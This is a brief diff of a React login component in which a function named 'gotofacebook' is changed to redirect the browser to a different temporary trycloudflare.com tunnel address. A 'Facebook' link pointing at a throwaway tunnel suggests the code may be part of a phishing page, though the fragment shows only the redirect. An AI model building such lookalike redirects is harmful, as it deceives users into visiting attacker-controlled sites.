@@ -16,7 +16,8 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-    window.location.href = 'https://mg-len-reviewing-monica.trycloudflare.com';
+    window.location.href = 'https://week-lat-together-brown.trycloudflare.com';
+
   }
 
   const handleLogin = async (e) => {
